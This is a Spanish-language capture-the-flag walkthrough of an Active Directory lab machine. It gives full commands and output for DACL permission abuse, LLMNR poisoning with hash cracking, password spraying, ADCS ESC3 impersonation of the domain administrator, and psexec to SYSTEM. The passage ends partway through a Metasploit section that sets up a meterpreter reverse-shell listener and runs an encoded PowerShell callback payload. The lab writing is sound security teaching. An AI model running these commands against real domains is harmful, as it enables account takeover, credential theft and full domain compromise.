| *El permiso WriteOwner en Active Directory (AD) es un derecho de control de acceso que permite a un principal de seguridad (usuario, grupo o equipo) modificar el propietario (owner) de un objeto dentro del directorio. Este objeto puede ser, entre otros, un usuario, grupo, equipo, unidad organizativa (OU), política de grupo (GPO) o plantilla de certificado.* |

Ahora entendamos qué podemos hacer con este permiso:

| **Abuso del Permiso WriteOwner** |
|:--------------------------------:|
| *Permite a los atacantes cambiar la propiedad de los objetos del directorio. Concretamente, al abusar del permiso WriteOwner en las listas de control de acceso discrecional (DACL), los adversarios pueden hacerse con el control de objetos sensibles y escalar privilegios dentro del dominio. En resume, el permiso WriteOwner te permite cambiar el propietario de ese objeto a cualquier usuario, permitiendo acciones como el cambio de contraseña de un usuario.* |

Aquí te dejo un blog que explica cómo abusar de este permiso; checa la sección **Exploitation Phase I**:
* <a href="https://www.hackingarticles.in/abusing-ad-dacl-writeowner/" target="_blank">Hacking Articles - Abusing AD-DACL: WriteOwner</a>

Utilizaremos la herramienta **impacket-owneredit** para hacer que el **usuario mark** sea nuevo propietario del **usuario bob**:
```bash
impacket-owneredit -action write -new-owner 'mark' -target-dn 'CN=bob,CN=Users,DC=PHANTOM,DC=THL' 'PHANTOM.THL'/'mark':'suP3rPa$sw0rd2026!&' -dc-ip 192.168.56.100
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-3580157585-956322742-780763674-512
[*] - sAMAccountName: Admins. del dominio
[*] - distinguishedName: CN=Admins. del dominio,CN=Users,DC=PHANTOM,DC=THL
[*] OwnerSid modified successfully!
```
Funcionó, modificamos la **DACL** del **objeto de usuario bob**.

Ahora, usemos la herramienta **impacket-dacledit** para hacer que el **usuario mark** tenga el **Control Total (Full Control)** del **usuario bob**:
```bash
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'mark' -target-dn 'CN=bob,CN=Users,DC=PHANTOM,DC=THL' 'PHANTOM.THL'/'mark':'suP3rPa$sw0rd2026!&' -dc-ip 192.168.56.100
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20260427-222659.bak
[*] DACL modified successfully!
```
Se modificó correctamente.

Cambiemos la contraseña del **usuario bob** con la herramienta **net**:
```bash
net rpc password bob 'SuperP@ass123' -U PHANTOM.THL/mark%'suP3rPa$sw0rd2026!&' -S 192.168.56.100
```

Comprobemos si funcionó el cambio con **netexec**:
```bash
nxc smb 192.168.56.100 -u 'bob' -p 'SuperP@ass123'
SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.56.100  445    DC01             [+] PHANTOM.THL\bob:SuperP@ass123
```
Muy bien, funcionó correctamente.

#### Abusando del Permiso AddSelf para Agregar al Usuario bob al Grupo IT {#AddSelf}

Primero entendamos, ¿qué hace el permiso `AddSelf`?

| **Permiso AddSelf** |
|:-------------------:|
| *El permiso AddSelf en Active Directory (AD), también conocido como Self-Membership, es un derecho de control de acceso que permite a un principal de seguridad (usuario, grupo o equipo) agregarse a sí mismo como miembro de un grupo específico. Este permiso se aplica comúnmente sobre objetos de tipo grupo y está diseñado para permitir escenarios controlados donde los usuarios pueden autogestionar su pertenencia a determinados grupos.* |

Ahora entendamos qué podemos hacer con este permiso:

| **Abusando del Permiso AddSelf** |
|:-------:|
| *Al aprovechar el permiso «AddSelf», los atacantes pueden escalar privilegios añadiéndose a sí mismos a grupos con privilegios, como «Domain Admins» u «Backup Operators». Como resultado, obtienen control administrativo, se desplazan lateralmente por la red, acceden a sistemas confidenciales y mantienen su presencia en el sistema.* |

Aquí te dejo un blog que explica como abusar de este servicio; checa la sección **Exploitation Phase I**:
* <a href="https://www.hackingarticles.in/addself-active-directory-abuse/" target="_blank">Hacking Articles - Abusing AD-DACL: AddSelf</a>

Usaremos la herramienta **bloodyAD** para asignar al **usuario bob** al grupo **IT**:
```bash
bloodyAD --host "192.168.56.100" -d "PHANTOM.THL" -u "bob" -p "SuperP@ass123" add groupMember "IT" "bob"
[+] bob added to IT
```

Podemos comprobar que este usuario ya pertenece al grupo **IT** con la herramienta **net**:
```bash
net rpc group members "IT" -U PHANTOM.THL/bob%'SuperP@ass123' -S 192.168.56.100
PHANTOM\bob
```

#### Abusando del Permiso WriteDacl para Modificar Permisos del Objeto Grupo HELPDESK {#WriteDacl}

Primero entendamos, ¿qué hace el permiso `WriteDacl`?

| **Permiso WriteDacl** |
|:---------------------:|
| *El permiso WriteDACL (Write Discretionary Access Control List) en Active Directory (AD) es un derecho de control de acceso que permite a un principal de seguridad (usuario, grupo o equipo) modificar la lista de control de acceso discrecional (DACL) de un objeto. La DACL es el componente encargado de definir qué entidades tienen permisos sobre un objeto y qué acciones pueden realizar sobre él.* |

Ahora entendamos qué podemos hacer con este permiso:

| **Abusando del Permiso WriteDacl** |
|:----------------------------------:|
| *Los atacantes pueden hacer un uso indebido de los permisos WriteDacl para obtener acceso no autorizado o modificar los permisos existentes con el fin de alcanzar sus objetivos. Por ejemplo, podemos modificar los permisos de un grupo para que permita asignar a cualquier usuario, cuando no debería hacerlo.* |

Aquí te dejo un blog que explica como abusar de este servicio; checa la sección **Exploitation Phase II**:
* <a href="https://www.hackingarticles.in/abusing-ad-dacl-writedacl/" target="_blank">Hacking Articles - Abusing AD-DACL: WriteDacl</a>

Utilizaremos la herramienta **impacket-dacledit** para hacer que el **usuario bob** tenga **Control Total (Full Control)** del grupo **HELPDESK**:
```bash
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'bob' -target-dn 'CN=HELPDESK,CN=Users,DC=PHANTOM,DC=THL' 'PHANTOM.THL'/'bob':'SuperP@ass123'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20260427-225913.bak
[*] DACL modified successfully!
```
Excelente, funciono.

Como tal, el **usuario bob** aún no está dentro del grupo **HELPDESK**, pero como ahora tiene el control total, podemos agregarlo con **bloodyAD**:
```bash
bloodyAD --host "192.168.56.100" -d "PHANTOM.THL" -u "bob" -p "SuperP@ass123" add groupMember "HELPDESK" "bob"
[+] bob added to HELPDESK
```
Muy bien, ahora **bob** también pertenece al grupo **HELPDESK**.

#### Abusando del Permiso ForceChangePassword para Cambiar la Contraseña del Usuario frank y Ganando Acceso a la Máquina Víctima {#ForcePassword}

Primero entendamos, ¿qué hace el permiso `ForceChangePassword`?

| **Permiso ForceChangePassword** |
|:-------------------------------:|
| *El permiso ForceChangePassword en Active Directory (AD), también conocido como “Reset Password”, es un derecho de control de acceso que permite a un principal de seguridad (usuario, grupo o equipo) restablecer la contraseña de otra cuenta sin necesidad de conocer la contraseña actual.* |

Ahora entendamos qué podemos hacer con este permiso:

| **Abuso de Permiso ForceChangePassword** |
|:----------------------------------------:|
| *Este permiso resulta especialmente peligroso para las cuentas con privilegios, ya que permite el movimiento lateral y el acceso no autorizado a otros sistemas mediante la suplantación de identidad de la cuenta comprometida.* |

Aquí te dejo un blog que explica como abusar de este servicio:
* <a href="https://www.hackingarticles.in/forcechangepassword-active-directory-abuse/" taget="_blank">Hacking Articles - Abusing AD-DACL: ForceChangePassword</a>

Utilizaremos la herramienta **net** para cambiar la contraseña del **usuario frank** usando al **usuario bob**:
```bash
net rpc password frank 'JakiadoJeje123' -U PHANTOM.THL/bob%'SuperP@ass123' -S 192.168.56.100
```

Comprobemos si funcionó el cambio con **netexec**:
```bash
nxc smb 192.168.56.100 -u 'frank' -p 'JakiadoJeje123'
SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.56.100  445    DC01             [+] PHANTOM.THL\frank:JakiadoJeje123
```
Funciono.

Y comprobemos si funciona con **WinRM**:
```bash
nxc winrm 192.168.56.100 -u 'frank' -p 'JakiadoJeje123'
WINRM       192.168.56.100  5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:PHANTOM.THL) 
WINRM       192.168.56.100  5985   DC01             [+] PHANTOM.THL\frank:JakiadoJeje123 (Pwn3d!)
```

Perfecto, tenemos acceso a la máquina víctima vía **WinRM**, pero esto es por el permiso `CanPSRemote`:

| **Permiso CanPSRemote** |
|:-----------------------:|
| *Este permiso indica que un principal de seguridad (usuario, grupo o equipo) puede establecer una sesión remota de PowerShell (PowerShell Remoting) sobre un sistema objetivo. En términos prácticos, CanPSRemote implica que el usuario tiene los privilegios necesarios para autenticarse y ejecutar comandos de manera remota mediante tecnologías como WinRM (Windows Remote Management) y PowerShell Remoting, generalmente a través de herramientas como Enter-PSSession o Invoke-Command.* |

Usemos **Evil-WinRM** para entrar a la máquina víctima:
```batch
evil-winrm -i 192.168.56.100 -u 'frank' -p 'JakiadoJeje123'

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\frank\Documents>
*Evil-WinRM* PS C:\Users\frank\Documents> whoami
phantom\frank
```
Estamos dentro; sin embargo, no encontraremos la flag del usuario por aquí.

### Aplicando LLMNR Poisoning con Responder para Capturar Hash NTLMv2 {#Responder}

Regresando al **servicio SMB**, resulta ser bastante extraño que no tenga ningún archivo y que tengamos permiso de escritura y lectura. 

Antes había mencionado que quizá había algún script que ejecute los archivos/script que se carguen al recurso **Dev Tools**, pero al subir una **Reverse Shell** de **Powershell** y después de esperar un rato, no pasó nada.

Sin embargo, aún pienso que hay algo que debe de estar por ahí ejecutándose, así que vamos a analizar el tráfico del **servicio SMB** con la herramienta **Responder** y veremos si es posible aplicar un **LLMNR Poisoning**.

| **LLMNR Poisoning** |
|:-------------------:|
| *El LLMNR Poisoning es un ataque de red en el que un atacante responde a las consultas de resolución de nombres de multidifusión de ámbito local (LLMNR) con respuestas falsificadas, engañando a las víctimas para que se conecten a un host malicioso y revelen sus credenciales de autenticación (normalmente, hash NTLM).* |

Aquí te dejo un blog que explica cómo es que se aplica el **LLMNR Poisoning**:
* <a href="https://evoila.com/blog/llmnr-poisoning/" target="_blank">LLMNR Poisoning</a>

Iniciemos el **Responder** y esperemos un poco.

Observa el resultado que obtenemos:
```bash
responder -I eth0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.

  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|
...
...
[+] Listening for events...

[*] [NBT-NS] Poisoned answer sent to 192.168.56.100 for name PHANTOM (service: File Server)
[*] [LLMNR]  Poisoned answer sent to XX for name PHANTOM
[*] [MDNS] Poisoned answer sent to 192.168.56.100  for name PHANTOM.LOCAL
[*] [LLMNR]  Poisoned answer sent to 192.168.56.100 for name PHANTOM
[*] [MDNS] Poisoned answer sent to XX for name PHANTOM.LOCAL
[*] [MDNS] Poisoned answer sent to 192.168.56.100  for name PHANTOM.LOCAL
[*] [MDNS] Poisoned answer sent to XX for name PHANTOM.LOCAL
[*] [LLMNR]  Poisoned answer sent to XX for name PHANTOM
[*] [LLMNR]  Poisoned answer sent to 192.168.56.100 for name PHANTOM
[*] [MDNS] Poisoned answer sent to XX for name PHANTOM.LOCAL
[*] [MDNS] Poisoned answer sent to 192.168.56.100  for name PHANTOM.LOCAL
[*] [LLMNR]  Poisoned answer sent to XX for name PHANTOM
[*] [MDNS] Poisoned answer sent to 192.168.56.100  for name PHANTOM.LOCAL
[*] [MDNS] Poisoned answer sent to XX for name PHANTOM.LOCAL
[*] [LLMNR]  Poisoned answer sent to 192.168.56.100 for name PHANTOM
[*] [LLMNR]  Poisoned answer sent to XX for name PHANTOM
[*] [LLMNR]  Poisoned answer sent to 192.168.56.100 for name PHANTOM
[SMB] NTLMv2-SSP Client   : XX
[SMB] NTLMv2-SSP Username : PHANTOM.LOCAL\robert
[SMB] NTLMv2-SSP Hash     : robert::PHANTOM.LOCAL.....
```
Hemos capturado un hash **NTLMv2** del **usuario robert**.

Además, el **Responder** parece mencionar un dominio erróneo, pues el dominio correcto es **PHANTOM.THL** y no **PHANTOM.LOCAL**.

Guarda ese hash en un archivo de texto y usaremos la herramienta **JohnTheRipper** para crackearlo:
```bash
john -w:/usr/share/wordlists/rockyou.txt robertHash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
**********         (robert)     
1g 0:00:00:03 DONE (2026-04-29 00:28) 0.2564g/s 2528Kp/s 2528Kc/s 2528KC/s ba2se8..b82508
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```
Genial, tenemos su contraseña.

Comprobemos que funcione con **netexec**:
```bash
nxc smb 192.168.56.100 -u 'robert' -p '**********'
SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.56.100  445    DC01             [+] PHANTOM.THL\robert:**********
```
Funciona y, si recordamos, este usuario se puede conectar a la máquina víctima vía **WinRM**.

Conectémonos usando **Evil-WinRM**:
```batch
evil-winrm -i 192.168.56.100 -u 'robert' -p '**********'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\robert\Documents>
```

Estamos dentro y, curiosamente, aquí encontraremos el culpable que permitió el **LLMNR Poisoning**:
```batch
*Evil-WinRM* PS C:\Users\robert\Documents> cat connect.ps1
$username = "PHANTOM.LOCAL\robert"
$password = "**********"

while ($true) {
	New-SmbMapping -RemotePath "\\PHANTOM.LOCAL\Dev Tools" -Username $username -Password $password

	Start-Sleep -Seconds 60
}
```
También encontraremos un archivo de texto, pero ese lo analizaremos más adelante.

En el escritorio, encontrarás la flag del usuario:
```batch
*Evil-WinRM* PS C:\Users\robert\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\robert\Desktop> cat user.txt
...
```

## Post Explotación {#Post}

### Analizando la Tombstone del AD y Aplicando Password Spraying {#Tombstone}

Analicemos el mensaje que encontramos en la sesión del **usuario robert**:
```batch
*Evil-WinRM* PS C:\Users\robert\Documents> cat migration_notes.txt
[OK] Verify application connectivity after the ERP migration

Validate that legacy authentication is still working for internal tools

Review Active Directory group memberships (DevOps / Support)

[OK] Confirm that backup jobs are running correctly

Check access permissions on shared resources

[IMPORTANT] Remember to clean up temporary test accounts created during the migration

Remove unused scripts and obsolete configurations

[OK] Verify expiration and renewal of internal certificates

Document performed steps and lessons learned from the migration
```
Parece ser una lista de cosas por hacer después de una migración, pero podemos leer que un hay tema importante, siendo que se deben eliminar las cuentas temporales que fueron creadas durante la migración.

Es posible revisar los elementos eliminados del AD, consultando la **Tombstone**:

| **Tombstone AD** |
|:----------------:|
| *Una tombstone en Active Directory es la representación de un objeto que ha sido eliminado, pero que aún se conserva temporalmente en el directorio antes de borrarse definitivamente.* |

Te recomiendo revisar estos blogs que mencionan cómo revisar la **Tombstone** desde **PowerShell**:
* <a href="https://activedirectorypro.com/how-to-check-tombstone-lifetime-of-active-directory/" target="_blank">How to Check Tombstone Lifetime of Active Directory</a>
* <a href="https://admindroid.com/how-to-get-deleted-users-in-active-directory" target="_blank">How to Detect Deleted Users in Active Directory</a>

Lo primero que debemos hacer es revisar en cuánto tiempo se vacía la **Tombstone**:
```batch
*Evil-WinRM* PS C:\Users\robert\Documents> Get-ADObject "CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=PHANTOM,DC=THL" -Properties tombstoneLifetime

DistinguishedName : CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=PHANTOM,DC=THL
Name              : Directory Service
ObjectClass       : nTDSService
ObjectGUID        : 721a02a6-54bc-44dc-9fd9-965b169f1341
tombstoneLifetime : 2147483647
```
Pues se va a vaciar en 5.8 millones de años.

Podemos revisar las cuentas eliminadas con el siguiente comando de **PowerShell**:
```batch
*Evil-WinRM* PS C:\Users\robert\Documents> Get-ADObject -IncludeDeletedObjects -Filter 'IsDeleted -eq $true -and ObjectClass -eq "user"'

Deleted           : True
DistinguishedName : CN=dev_test\0ADEL:55a7bc61-fdc9-4ecc-bec5-25703d9ee855,CN=Deleted Objects,DC=PHANTOM,DC=THL
Name              : dev_test
                    DEL:55a7bc61-fdc9-4ecc-bec5-25703d9ee855
ObjectClass       : user
ObjectGUID        : 55a7bc61-fdc9-4ecc-bec5-25703d9ee855
```

También podemos ver todos los objetos eliminados de la siguiente forma:
```batch
*Evil-WinRM* PS C:\Users\robert\Documents> Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -SearchBase "CN=Deleted Objects,DC=PHANTOM,DC=THL"

Deleted           : True
DistinguishedName : CN=Deleted Objects,DC=PHANTOM,DC=THL
Name              : Deleted Objects
ObjectClass       : container
ObjectGUID        : 63e0d32e-2125-40ad-8405-c87b353e09b9

Deleted           : True
DistinguishedName : CN=dev_test\0ADEL:55a7bc61-fdc9-4ecc-bec5-25703d9ee855,CN=Deleted Objects,DC=PHANTOM,DC=THL
Name              : dev_test
                    DEL:55a7bc61-fdc9-4ecc-bec5-25703d9ee855
ObjectClass       : user
ObjectGUID        : 55a7bc61-fdc9-4ecc-bec5-25703d9ee855
```
En ambos casos, podemos ver que existió un usuario llamado **dev_test**.

Podemos utilizar el **GUID** de ese usuario para ver sus propiedades como objeto, siendo que encontraremos algo interesante:
```bash
*Evil-WinRM* PS C:\Users\robert\Documents> Get-ADObject -IncludeDeletedObjects -Identity "55a7bc61-fdc9-4ecc-bec5-25703d9ee855" -Properties *
...
Deleted                         : True
Description                     : **********
DisplayName                     : dev_test
DistinguishedName               : CN=dev_test\0ADEL:55a7bc61-fdc9-4ecc-bec5-25703d9ee855,CN=Deleted Objects,DC=PHANTOM,DC=THL
...
```
La descripción del usuario parece ser una contraseña, pero no sabemos a qué usuario puede pertenecer.

Apliquemos **Password Spraying** con **netexec** para identificar si un usuario tiene esta contraseña:
```bash
nxc smb 192.168.56.100 -u usuarios.txt -p '**********' --no-bruteforce --continue-on-success
SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:None) (Null Auth:True)
...
SMB         192.168.56.100  445    DC01             [+] PHANTOM.THL\tomas:**********
```
Perfecto, el **usuario tomas** usa la misma contraseña.

Podemos comprobarlo una vez más con **netexec**:
```bash
nxc smb 192.168.56.100 -u 'tomas' -p '**********'
SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.56.100  445    DC01             [+] PHANTOM.THL\tomas:**********
```

Este usuario también tiene permitido conectarnos a la máquina víctima vía **WinRM**, por lo que usaremos **Evil-WinRM** de nuevo:
```batch
evil-winrm -i 192.168.56.100 -u 'tomas' -p '**********'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\tomas\Documents> whoami
phantom\tomas
```

### Aplicando Ataque de Certificados ESC3 - ADCS ESC3: Enrollment Agent Template {#ESC3}

Llegados a este punto, tenemos en nuestro poder las credenciales de 5 usuarios, pero revisando **BloodHound** no encontraremos una forma de escalar privilegios.

En este punto podemos usar la herramienta **winPEASx64** para buscar alguna vulnerabilidad.

Puedes descargar **winPEASx64** desde aquí:
* <a href="https://github.com/peass-ng/PEASS-ng" target="_blank">Repositorio de peass-ng: PEASS-ng</a>

Al ejecutarlo desde la sesión del **usuario frank**, nos dirá lo siguiente:
```bash
ÉÍÍÍÍÍÍÍÍÍÍ¹ AD CS misconfigurations for ESC
È  https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates.html
È Check for ADCS misconfigurations in the local DC registry
  StrongCertificateBindingEnforcement:  - Allow weak mapping if SID extension missing, may be vulnerable to ESC9.
  CertificateMappingMethods:  - Strong Certificate mapping enabled.
  IF_ENFORCEENCRYPTICERTREQUEST set in InterfaceFlags - not vulnerable to ESC11.
  szOID_NTDS_CA_SECURITY_EXT not disabled for the CA - not vulnerable to ESC16.
È 
If you can modify a template (WriteDacl/WriteOwner/GenericAll), you can abuse ESC4
  Dangerous rights over template: Phantom-DevAuth  (Rights: ExtendedRight)
  Dangerous rights over template: User  (Rights: WriteProperty,ExtendedRight)
  Dangerous rights over template: UserSignature  (Rights: WriteProperty,ExtendedRight)
  Dangerous rights over template: ClientAuth  (Rights: WriteProperty,ExtendedRight)
  Dangerous rights over template: EFS  (Rights: WriteProperty,ExtendedRight)
  [*] Tip: Abuse with tools like Certipy (template write -> ESC1 -> enroll).
```
Esto indica que es posible usar uno de los 5 **templates** para poder escalar privilegios, y entre estos podemos ver uno curioso que se llama **Phantom-DevAuth**.

Podemos enumerar los **templates** del AD con la herramienta **certipy-ad**; probemos con el **usuario frank**:
```bash
certipy-ad find -u 'frank' -p 'JakiadoJeje123' -dc-ip 192.168.56.100 -vulnerable
Certipy v5.0.4 - by Oliver Lyak (ly4k)
...
[*] Saving text output to '20260501191831_Certipy.txt'
[*] Wrote text output to '20260501191831_Certipy.txt'
[*] Saving JSON output to '20260501191831_Certipy.json'
[*] Wrote JSON output to '20260501191831_Certipy.json'
```
Puedes leer cualquiera de estos 2 archivos.

Lo malo, al final nos indica que no pudo encontrar un **template** vulnerable:
```bash
cat 20260501191831_Certipy.txt
Certificate Authorities
  0
    CA Name                             : PHANTOM-DC01-CA
    DNS Name                            : DC01.PHANTOM.THL
...
...
...
        Enroll                          : PHANTOM.THL\Authenticated Users
Certificate Templates                   : [!] Could not find any certificate template
```

Probando con otros usuarios, resulta que con el **usuario tomas** obtenemos un resultado diferente:
```bash
cat 20260430195706_Certipy.txt
Certificate Authorities
  0
    CA Name                             : PHANTOM-DC01-CA
    DNS Name                            : DC01.PHANTOM.THL
    Certificate Subject                 : CN=PHANTOM-DC01-CA, DC=PHANTOM, DC=THL
    Certificate Serial Number           : 161A58313EFA72A045F730EFC3CFED39
    Certificate Validity Start          : 2026-02-21 23:23:37+00:00
    Certificate Validity End            : 2031-02-21 23:33:37+00:00
...
...
Certificate Templates
  0
    Template Name                       : Phantom-DevAuth
    Display Name                        : Phantom-DevAuth
    Certificate Authorities             : PHANTOM-DC01-CA
    Enabled                             : True
    Client Authentication               : False
...
...
    [+] User Enrollable Principals      : PHANTOM.THL\Tomas
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
```

Resulta que el **Certificate Template** que mencionó **winPEASx64**, que es **Phantom-DevAuth**, es vulnerable al **ataque ESC3**:

| **ESC3 Attack** |
|:---------------:|
| *ESC3 (Enterprise Security Configuration 3) es una mala configuración en Active Directory Certificate Services (AD CS) que permite a un atacante solicitar un certificado en nombre de otro usuario (impersonación) usando una plantilla vulnerable. Ocurre cuando existe una plantilla de certificado que permite Enrollment Agent y además permite solicitar certificados en nombre de otros usuarios.* |

Aquí te dejo estos 3 blogs que te ayudarán a aplicar y entender este ataque:
* <a href="https://www.hackingarticles.in/adcs-esc3-enrollment-agent-template/" target="_blank">Hacking Articles - ADCS ESC3: Enrollment Agent Template</a>
* <a href="https://zonahacking.com/post/esc3" target="_blank">ZonaHacking: ESC3</a>
* <a href="https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc3/#elementor-toc__heading-anchor-4" target="_blank">Active Directory Certificate Services (ADCS – ESC3)</a>

Primero, vamos a generar un certificado válido para nuestro **usuario tomas** usando la **template Phantom-DevAuth**:
```bash
certipy-ad req -u 'tomas@PHANTOM.THL' -p '**********' -dc-ip 192.168.56.100 -ca PHANTOM-DC01-CA -target 'DC01.PHANTOM.THL' -template 'Phantom-DevAuth'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 13
[*] Successfully requested certificate
[*] Got certificate with UPN 'tomas@PHANTOM.THL'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'tomas.pfx'
[*] Wrote certificate and private key to 'tomas.pfx'
```

Ahora, utilizamos ese mismo certificado para que podamos generar otro, pero usando el **template User**, que es quien nos permitirá suplantar al **Administrador**:
```bash
certipy-ad req -u 'tomas@PHANTOM.THL' -p '**********' -dc-ip 192.168.56.100 -ca 'PHANTOM-DC01-CA' -target 'DC01.PHANTOM.THL' -template 'User' -on-behalf-of 'administrador' -pfx tomas.pfx
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 15
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrador@PHANTOM.THL'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrador.pfx'
[*] Wrote certificate and private key to 'administrador.pfx'
```

Por último, utilizamos el certificado del **Administrador** para que podamos autenticarnos en el **AD** y obtengamos un **TGT** y su **Hash NTLM**:
```bash
certipy-ad auth -pfx administrador.pfx -username 'administrador' -domain 'PHANTOM.THL' -dc-ip 192.168.56.100
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrador@PHANTOM.THL'
[*] Using principal: 'administrador@phantom.thl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrador.ccache'
[*] Wrote credential cache to 'administrador.ccache'
[*] Trying to retrieve NT hash for 'administrador'
[*] Got hash for 'administrador@phantom.thl':...
```
Ya con el **TGT** y con el **Hash NTLM**, podemos conectarnos en la máquina víctima usando **impacket-psexec**.

Probemos con el **TGT**, siendo que primero lo exportamos y luego usamos **impacket-psexec** para autenticarnos usando ese **TGT**:
```batch
export KRB5CCNAME=administrador.ccache

impacket-psexec administrador@DC01.PHANTOM.THL -k -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on DC01.PHANTOM.THL.....
[*] Found writable share ADMIN$
[*] Uploading file SadReSac.exe
[*] Opening SVCManager on DC01.PHANTOM.THL.....
[*] Creating service wOFw on DC01.PHANTOM.THL.....
[*] Starting service wOFw.....
[!] Press help for extra shell commands
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
Microsoft Windows [Versi�n 10.0.20348.587]

(c) Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32> whoami
nt authority\system
```

Ahora probemos con el **Hash NTLM**, donde solo utilizamos el parámetro `-hashes`:
```batch
impacket-psexec administrador@DC01.PHANTOM.THL -hashes '******'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on DC01.PHANTOM.THL.....
[*] Found writable share ADMIN$
[*] Uploading file rTiqzwcC.exe
[*] Opening SVCManager on DC01.PHANTOM.THL.....
[*] Creating service YoQl on DC01.PHANTOM.THL.....
[*] Starting service YoQl.....
[!] Press help for extra shell commands
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
Microsoft Windows [Versi�n 10.0.20348.587]

(c) Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32> whoami
nt authority\system
```

Ya dentro, busquemos la última flag:
```batch
C:\Windows\system32> cd C:\Users\Administrador\Desktop

C:\Users\Administrador\Desktop> type root.txt
....
```
Y con esto terminamos la máquina.

### Escalando Privilegios con Metasploit Framework {#Metasploit}

Durante la búsqueda de vulnerabilidades, se pudo encontrar que la máquina víctima es vulnerable al Exploit `cve_2024_30085_cloud_files`, que lo tenemos como módulo de **Metasploit Framework**.

Sigamos todo el proceso para utilizar este módulo.

#### Obteniendo una Sesión de Meterpreter {#Meterpreter}

Primero, debemos obtener una sesión de **Meterpreter**, así que iniciemos **Metasploit**:
```bash
msfconsole -q
[*] Starting persistent handler(s)...
msf > 
```

Carguemos y configuremos un listener, usando el módulo `/exploit/multi/handler`:
```bash
msf > use /exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set LHOST Tu_IP
LHOST => Tu_IP
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > exploit
[*] Started reverse TCP handler on Tu_IP:443
```

Para mandar una **Reverse Shell** de **Meterpreter** a nuestro listener, usaremos un comando de **PowerShell** generado con la herramienta **msfvenom**:
```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=Tu_IP LPORT=443 -f psh-cmd
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of psh-cmd file: 7571 bytes
...
```

Desde cualquier sesión de **Evil-WinRM**, ejecuta ese comando desde que inicia el binario de **PowerShell** hasta el final:
```bash
*Evil-WinRM* PS C:\Users\robert\Documents> powershell.exe -nop -w hidden -e aQBmA...
```

Observa el listener:
```bash
